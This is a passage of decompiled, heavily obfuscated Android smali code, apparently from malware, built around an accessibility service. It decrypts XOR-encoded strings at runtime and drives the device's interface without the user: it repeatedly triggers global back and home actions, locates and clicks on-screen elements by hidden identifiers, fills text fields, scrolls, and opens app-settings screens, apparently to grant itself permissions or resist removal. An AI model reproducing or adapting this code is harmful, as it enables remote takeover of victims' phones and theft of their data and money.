    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C0()V

    return-void
.end method

.method public static synthetic Y(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n2(Landroid/content/Context;)V

    return-void
.end method

.method public static Y0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->A1()V

    return-void
.end method

.method private static synthetic Y1(Z)V
    .locals 2

    .line 1
    const/16 p0, 0x15e

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x12

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x5ft
        0x13t
        0x53t
        -0x15t
        -0x3at
        0x1ft
        0x17t
        0xbt
        -0x57t
        0x19t
        0x18t
        -0x5t
        -0x24t
        0x2t
        0x7t
        0x5et
        -0x52t
        0x4ct
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x40t
        0x7dt
        0x37t
        -0x67t
        -0x57t
        0x76t
        0x73t
        0x31t
    .end array-data
.end method

.method public static Y2()V
    .locals 3

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/16 v1, 0xc8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C0()V

    return-void
.end method

.method static synthetic Z()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o1()V

    return-void
.end method

.method public static Z0()V
    .locals 4

    .line 1
    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x13

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/16 v1, 0x3e8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :try_start_0
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$s;

    invoke-direct {v1, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$s;-><init>(Landroid/os/Handler;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x42t
        0x7t
        -0x4dt
        0x56t
        0x5ft
        -0x7ct
        0x2t
        0x65t
        -0x54t
        0xct
        -0x5dt
        0x50t
        0x59t
        -0x7dt
        0x1t
        0x38t
        -0xft
        0x28t
        -0x79t
        0x74t
        0x7ct
        -0x5ct
        0x25t
        0xat
        -0x75t
        0x20t
        -0x68t
        0x6at
        0x6ft
        -0x57t
        0x23t
        0x1ft
        -0x62t
        0x20t
        -0x65t
        0x77t
        0x6ft
        -0x42t
        0x23t
        0x1ft
        -0x75t
        0x20t
        -0x67t
        0x63t
        0x63t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x21t
        0x69t
        -0x29t
        0x24t
        0x30t
        -0x13t
        0x66t
        0x4bt
    .end array-data

    :array_2
    .array-data 1
        0x1bt
        0x2ft
        -0x70t
        -0x28t
        0x38t
        0x46t
        0x21t
    .end array-data

    :array_3
    .array-data 1
        0x6bt
        0x4et
        -0xdt
        -0x4dt
        0x59t
        0x21t
        0x44t
        -0x6ft
    .end array-data

    :array_4
    .array-data 1
        -0x1et
        -0x40t
        0x5et
        0x14t
        -0x55t
        -0x78t
        -0x65t
        -0xct
        -0x12t
        -0x3at
        0x57t
        0x14t
        -0x44t
        -0x7dt
        -0x6ft
        -0x1et
        -0x18t
        -0x3ft
        0x54t
    .end array-data

    :array_5
    .array-data 1
        -0x7ft
        -0x51t
        0x33t
        0x3at
        -0x36t
        -0x1at
        -0x1t
        -0x7at
    .end array-data
.end method

.method private static synthetic Z1()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r1()V

    return-void
.end method

.method public static Z2()V
    .locals 3

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/16 v1, 0xc8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G1()V

    return-void
.end method

.method public static synthetic a(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x2(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic a0(I)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    return-void
.end method

.method public static a1()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->q1()V

    return-void
.end method

.method private static synthetic a2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l1()V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/jz;

    invoke-direct {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/jz;-><init>()V

    const-wide/16 v1, 0xdac

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static a3()V
    .locals 3

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->h:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->i:Z

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    :goto_0
    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/16 v1, 0xc8

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->C0()V

    return-void
.end method

.method public static synthetic b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2, p3, p4}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l2(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic b0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->K1()V

    return-void
.end method

.method public static b1()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I1()V

    return-void
.end method

.method private static synthetic b2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ez;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ez;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x1000

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    return-void
.end method

.method public static synthetic c(Z)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->d2(Z)V

    return-void
.end method

.method static synthetic c0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n1()V

    return-void
.end method

.method private static c1()V
    .locals 5

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    :try_start_0
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-lt v1, v2, :cond_0

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/s1;->a()Z

    move-result v1

    if-nez v1, :cond_0

    new-instance v1, Landroid/content/Intent;

    const/16 v2, 0x37

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x7

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v3, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v2, v3, v4}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x20000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cz;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cz;-><init>()V

    const-wide/16 v2, 0x5dc

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_2

    :catchall_0
    move-exception v0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_1

    :goto_0
    throw v0

    :goto_1
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    :goto_2
    return-void

    :array_0
    .array-data 1
        0x6ct
        -0x65t
        0x1et
        0x61t
        0x3bt
        0x45t
        -0x3et
        0x7at
        0x7et
        -0x70t
        0xet
        0x67t
        0x3dt
        0x42t
        -0x3ft
        0x27t
        0x23t
        -0x48t
        0x3bt
        0x5dt
        0x15t
        0x6bt
        -0x1dt
        0xbt
        0x4ct
        -0x5bt
        0x2at
        0x4ct
        0x15t
        0x60t
        -0x16t
        0xbt
        0x4bt
        -0x44t
        0x36t
        0x56t
        0x7t
        0x73t
        -0x19t
        0x17t
        0x4et
        -0x50t
        0x29t
        0x40t
        0xbt
        0x7ct
        -0x1dt
        0x6t
        0x40t
        -0x44t
        0x29t
        0x40t
        0x1dt
        0x63t
        -0x18t
    .end array-data

    :array_1
    .array-data 1
        0xdt
        -0xbt
        0x7at
        0x13t
        0x54t
        0x2ct
        -0x5at
        0x54t
    .end array-data

    :array_2
    .array-data 1
        -0x71t
        -0x80t
        -0x2et
        -0x3dt
        0x50t
        0x25t
        0x2et
    .end array-data

    :array_3
    .array-data 1
        -0x1t
        -0x1ft
        -0x4ft
        -0x58t
        0x31t
        0x42t
        0x4bt
        -0x6et
    .end array-data
.end method

.method private static synthetic c2(Landroid/os/Handler;)V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v2, 0x800000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ty;

    invoke-direct {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ty;-><init>(Landroid/os/Handler;)V

    const-wide/16 v1, 0x3e8

    invoke-virtual {p0, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private static c3(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    :try_start_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x2000

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_0
    :goto_0
    return-void
.end method

.method public static synthetic d(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f2(Landroid/os/Handler;)V

    return-void
.end method

.method static synthetic d0()Landroid/content/Context;
    .locals 1

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    return-object v0
.end method

.method private static d1(Ljava/util/List;)Ljava/util/List;
    .locals 6

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    invoke-interface {p0}, Ljava/util/List;->size()I

    move-result v3

    if-ge v2, v3, :cond_1

    invoke-interface {p0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    const/4 v5, 0x1

    if-ne v4, v5, :cond_0

    invoke-virtual {v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    return-object v0
.end method

.method private static synthetic d2(Z)V
    .locals 0

    .line 1
    return-void
.end method

.method private static d3(I)V
    .locals 3

    .line 1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x29

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-nez p0, :cond_0

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x30

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-nez p0, :cond_0

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x21

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v2, v1, [B

    fill-array-data v2, :array_5

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    :cond_0
    const/16 v0, 0x12c

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    if-eqz p0, :cond_7

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 p0, 0x320

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x24

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v2, v1, [B

    fill-array-data v2, :array_7

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_1

    :goto_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->P1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)V

    goto :goto_1

    :cond_1
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x2b

    new-array v0, v0, [B

    fill-array-data v0, :array_8

    new-array v2, v1, [B

    fill-array-data v2, :array_9

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_6

    goto :goto_0

    :goto_1
    const/16 p0, 0x1f4

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v0, 0x1d

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v2, v1, [B

    fill-array-data v2, :array_b

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-nez p0, :cond_2

